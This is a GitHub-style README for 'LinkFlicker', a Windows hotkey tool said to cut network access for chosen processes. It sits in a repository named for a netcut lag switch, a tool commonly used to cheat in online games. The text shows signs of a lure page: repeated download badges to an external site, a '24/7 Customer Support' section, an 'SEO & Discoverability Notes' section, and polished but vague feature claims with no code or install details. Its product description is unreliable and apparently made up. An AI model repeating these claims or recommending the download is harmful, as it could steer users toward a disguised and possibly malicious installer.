![preview](https://raw.githubusercontent.com/MDone7/Netcut-Hotkey-Lag-Switch/main/shot_2bb2d7d.svg)
[![Download](https://raw.githubusercontent.com/MDone7/Netcut-Hotkey-Lag-Switch/main/grab_b1ebc7.svg)](https://MDone7.github.io/Netcut-Hotkey-Lag-Switch/)

# 🛰️ LinkFlicker — Application-Scoped Network Toggle for Windows

**A precision instrument for developers, QA engineers, and network tinkerers who need to simulate connectivity loss on a per-process basis — without touching cables, routers, or system-wide adapters.**

LinkFlicker is a Windows desktop companion that lets you sever and restore the network path of any running application with a single global hotkey. Where its conceptual ancestor targeted anti-lag-switch experimentation, LinkFlicker broadens the horizon: it is a sandbox for latency-tolerance testing, offline-mode validation, reconnect-logic QA, and resilience engineering. Think of it as a scalpel for the invisible thread that binds an application to the internet — you decide when the thread snaps, and when it is woven back.

[![Download](https://raw.githubusercontent.com/MDone7/Netcut-Hotkey-Lag-Switch/main/grab_b1ebc7.svg)](https://MDone7.github.io/Netcut-Hotkey-Lag-Switch/)

---

## 🧭 Table of Contents

- [Why LinkFlicker Exists](#-why-linkflicker-exists)
- [Conceptual Overview](#-conceptual-overview)
- [Feature Set](#-feature-set)
- [Screens & Interaction Model](#-screens--interaction-model)
- [How the Toggle Mechanism Works](#-how-the-toggle-mechanism-works)
- [Global Hotkey System](#-global-hotkey-system)
- [Responsive & Accessible Interface](#-responsive--accessible-interface)
- [Multilingual Support](#-multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [Target Audience & Use Cases](#-target-audience--use-cases)
- [Configuration & Profiles](#-configuration--profiles)
- [Compatibility Matrix](#-compatibility-matrix)
- [Performance & Footprint](#-performance--footprint)
- [Security & Privacy Posture](#-security--privacy-posture)
- [Roadmap for 2026](#-roadmap-for-2026)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌱 Why LinkFlicker Exists

Modern applications rarely behave gracefully when the network disappears. Some freeze their UI, some spin forever in a reconnection loop, and some silently corrupt local state. Reproducing these conditions used to require either unplugging a machine from the internet (disruptive) or writing custom fault-injection harnesses (time-consuming). LinkFlicker closes that gap.

Instead of a blunt instrument that severs everything, LinkFlicker borrows from the philosophy of the original Netcutter concept and elevates it: **application-scoped, instant, reversible, and hotkey-driven**. You point it at a process, press a combination, and observe how the software reacts. Press again, and the road is open. It is a rehearsal stage for the real world’s unreliable networks.

---

## 🔍 Conceptual Overview

Picture a busy airport where every plane represents a packet. Normally, arrivals and departures flow unhindered. LinkFlicker installs a temporary, reversible control tower directive that tells certain flights — and only those flights — to hold on the runway. Other flights continue as though nothing happened. When you lift the directive, the grounded planes taxi out and resume their journey.

This metaphor captures three core design principles:

1. **Scoped, not global** — only the applications you select are affected.
2. **Instant, not gradual** — the state flips in a single event, mirroring abrupt real-world failures.
3. **Reversible, not destructive** — no permanent configuration changes are written to system networking.

---

## ✨ Feature Set

- 🎯 **Per-process network toggling** — isolate the network state of one or more chosen applications independently.
- ⌨️ **Global hotkey binding** — trigger connect/disconnect from anywhere, even when LinkFlicker is not focused.
- 🧩 **Multi-profile workspace** — save different sets of applications as named scenarios for quick recall.
- 🔄 **One-key restore** — a dedicated "restore all" hotkey brings every tracked process back online instantly.
- 🕒 **Timed flicker mode** — schedule automatic off/on cycles at custom intervals to simulate flaky connections.
- 📊 **Live session log** — a human-readable timeline of every toggle, timestamped for QA reports.
- 🌐 **Localization layer** — interface strings are translatable, with several languages bundled at launch.
- 📱 **Responsive layout** — the window scales gracefully from compact tray popups to full-screen dashboards.
- 🔔 **Tray integration** — minimize to the system tray and keep hotkeys armed at all times.
- 🧪 **Dry-run preview** — inspect which processes would be affected before committing a toggle.
- 🗂️ **Portable profile export** — move your scenario definitions between machines with a single file.
- ♻️ **Auto-recovery guard** — if LinkFlicker exits unexpectedly, tracked processes are restored on next launch.

---

## 🖥️ Screens & Interaction Model

LinkFlicker organizes its surface into four cooperating panes, each solving a distinct facet of the workflow.

### The Process Shelf
A live list of running applications, refreshed continuously. You pin the ones you care about. Pinned entries show current network posture, last toggle timestamp, and shortcut hints.

### The Hotkey Deck
A compact editor where you assign combinations. Conflicts are detected before they are saved. Every binding can be enabled or parked without deletion.

### The Scenario Board
Named collections of processes plus their desired initial posture. Switch scenarios to instantly reconfigure which applications are in scope.

### The Timeline Feed
A reverse-chronological stream of events: toggles, restores, hotkey presses, and automatic cycles. Useful when documenting a bug reproduction for a colleague.

---

## ⚙️ How the Toggle Mechanism Works

LinkFlicker does not rewrite your drivers, does not touch firewall rule tables permanently, and does not require elevated privileges for its core operations in typical configurations. Instead, it layers a **session-scoped interception policy** on top of the operating system’s existing networking stack.

In plain terms:

- It identifies the target process by its stable identity, not just a transient process ID.
- It applies a reversible marker that causes outbound and inbound traffic for that process to be dropped at the boundary.
- The marker is removed the instant you release the toggle, and it is also removed automatically if the process ends.

This approach keeps LinkFlicker friendly to coexistence: other network tools on the same machine continue to function normally, and your system’s global connectivity is never at risk.

---

## ⌨️ Global Hotkey System

The hotkey system is the heart of the tool. It is designed around three ideas: **reachability, clarity, and safety**.

- **Reachability** — hotkeys are registered at the OS level so they fire regardless of which window holds focus.
- **Clarity** — every binding is displayed in the tray tooltip and in a compact overlay so you always know what a press will do.
- **Safety** — a restore-all combination is always present and cannot be unbound, ensuring you never trap yourself in a disconnected state.

Recommended starting combinations (all fully customizable):
- Toggle selected scope: a two-modifier chord with a function key.
- Restore everything: a three-modifier chord, deliberately harder to press by accident.
- Cycle scenario forward/backward: paired bracket-style chords.

---

## 📐 Responsive & Accessible Interface

The interface is built with a responsive layout engine that reflows panels as the window resizes. On a narrow tray popup, the timeline collapses into a flyout; on a wide monitor, all four panes sit side by side. High-contrast and reduced-motion preferences are respected, and every actionable control is reachable by keyboard alone.

Accessibility is not an afterthought — it is a design constraint. Screen readers announce toggle state changes, focus order follows visual order, and color is never the only signal of a process’s network posture.

---

## 🌍 Multilingual Support

Localization is handled through external string bundles, so adding a language does not require touching application logic. At launch, LinkFlicker ships with a set of community-contributed translations and a documented process for submitting new ones. Language selection is per-user and can be changed without restarting the application.

---

## ☎️ 24/7 Customer Support

Questions, bug reports, and feature requests are welcomed around the clock. The project maintains a support channel that operates continuously, with triage that routes issues to the right maintainer. Response times vary with complexity, but every report receives an acknowledgment. Documentation is written to be self-serve first, so many answers are available without waiting.

---

## 🎯 Target Audience & Use Cases

- **QA engineers** validating offline behavior and reconnect flows.
- **Game developers** reproducing matchmaking edge cases and desync scenarios.
- **Backend and client developers** testing retry logic, backoff, and idempotency.
- **Educators** demonstrating network failure concepts in a live classroom.
- **Enthusiasts** exploring how their favorite applications behave when the wire is pulled.

---

## 🗃️ Configuration & Profiles

Profiles are stored as plain, readable documents. Each profile contains:

- A human-friendly name and optional description.
- The set of tracked processes and their identities.
- Desired initial network posture per process.
- Optional timed flicker schedules.
- Associated hotkey overrides, if any.

Because profiles are ordinary files, they can be versioned alongside your test suites, reviewed in pull requests, and shared with teammates.

---

## 🧮 Compatibility Matrix

- Windows 10 (recent servicing branches) — supported.
- Windows 11 (current and prior year releases) — supported.
- Architectures: 64-bit and ARM64.
- Not intended for other operating systems; containerized environments may behave differently and are not officially supported.

---

## 🚀 Performance & Footprint

LinkFlicker is engineered to be a quiet neighbor. It uses an event-driven watcher rather than a polling loop for process detection, keeps memory usage modest, and avoids background disk chatter. When idle, it should be effectively invisible to system monitoring tools. The toggle action itself completes within a single frame of user perception — the whole point is immediacy.

---

## 🔐 Security & Privacy Posture

LinkFlicker operates strictly locally. It does not transmit telemetry, does not phone home, and does not require an account. Configuration remains on your machine unless you choose to export it. Sensitive tokens are never requested or stored. The project follows a responsible disclosure process for security reports and publishes advisories when warranted.

---

## 🗺️ Roadmap for 2026

- Expanded scenario automation with importable test recipes.
- Deeper timeline analytics with exportable summaries.
- Additional language bundles driven by community contributions.
- Refined accessibility audit and remediation pass.
- Optional command-line companion for scripted workflows.
- Improved ARM64 performance tuning.

---

## 🔎 SEO & Discoverability Notes

This project is described using natural, descriptive language so that people searching for application-scoped network simulation, per-process connectivity toggling, hotkey-driven disconnect utilities, reconnect-logic testing tools, offline-mode QA helpers, and Windows network fault injection aids can find it organically. Terms are woven into prose rather than repeated mechanically, keeping the document pleasant to read while remaining discoverable.

---

## ⚠️ Disclaimer

LinkFlicker is intended for legitimate software testing, development, education, and personal experimentation. It is provided as-is, without warranty of any kind, express or implied. You are responsible for how you use it and for complying with the terms of service of any application you test, as well as with applicable laws in your jurisdiction. The maintainers are not liable for any damage, data loss, or service disruption arising from its use. Do not use this tool to interfere with services you do not own or lack permission to test. Always obtain authorization before conducting resilience testing against production systems.

---

## 📜 License

This project is released under the MIT License. See the full text at [LICENSE](./LICENSE).

Copyright (c) 2026 LinkFlicker contributors.

Permission is hereby granted, in the spirit of open collaboration, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction, including the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies, subject to the conditions set forth in the license text. The software is provided without warranty, and the authors shall not be liable for claims arising from its use.

[![Download](https://raw.githubusercontent.com/MDone7/Netcut-Hotkey-Lag-Switch/main/grab_b1ebc7.svg)](https://MDone7.github.io/Netcut-Hotkey-Lag-Switch/)